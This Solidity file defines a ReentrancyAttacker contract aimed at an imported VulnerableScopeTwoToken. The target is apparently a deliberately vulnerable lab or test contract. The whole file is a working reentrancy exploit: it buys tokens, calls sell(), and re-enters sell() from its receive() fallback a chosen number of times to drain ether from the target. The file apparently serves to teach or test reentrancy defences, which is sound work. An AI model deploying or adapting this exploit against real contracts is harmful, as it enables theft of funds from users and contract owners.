// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./VulnerableScopeTwoToken.sol";

contract ReentrancyAttacker {
  VulnerableScopeTwoToken public target;
  uint256 public overallAttacksCount;
  uint256 public attackCount;
  uint256 public amountToSell;
  bool public keepAttacking = true;

  event NewAttack(uint attackNumber);

  constructor(address _target) {
    target = VulnerableScopeTwoToken(_target);
  }

  function buySomeTokens() external payable {
    target.buy{ value: msg.value }();
  }

  function setAttacksCount(uint count) external {
    overallAttacksCount = count;
  }

  function attack(uint _amountToSell) external payable {
    amountToSell = _amountToSell;
    target.sell(amountToSell);
  }

  receive() external payable {
    if (keepAttacking && attackCount < overallAttacksCount) {
      attackCount++;
      emit NewAttack(attackCount);
      target.sell(amountToSell);
    }
  }
}
